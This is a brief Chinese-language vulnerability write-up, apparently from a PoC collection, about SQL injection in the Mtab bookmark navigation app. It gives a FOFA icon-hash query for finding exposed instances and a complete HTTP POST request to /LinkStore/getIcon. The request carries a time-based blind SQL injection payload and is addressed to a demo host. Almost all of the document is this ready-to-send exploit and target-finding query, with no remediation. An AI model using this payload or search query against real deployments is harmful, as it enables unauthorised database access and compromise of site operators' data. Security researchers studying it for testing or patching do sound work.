# Mtab书签导航程序存在SQL注入漏洞

https://github.com/tsxcw/mtab

## fofa

```yaml
icon_hash="391069193"
```

## poc

```json
POST /LinkStore/getIcon HTTP/1.1
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json, text/plain, */*
Content-Length: 50
Accept-Encoding: gzip,deflate,br
Accept-Ldwk: bG91ZG9uZ3dlbmt1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Host: demo.mtab.cc
Connection: Keep-alive

{"url":"'XOR(if(now()=sysdate(),sleep(4),0))XOR'"}
```

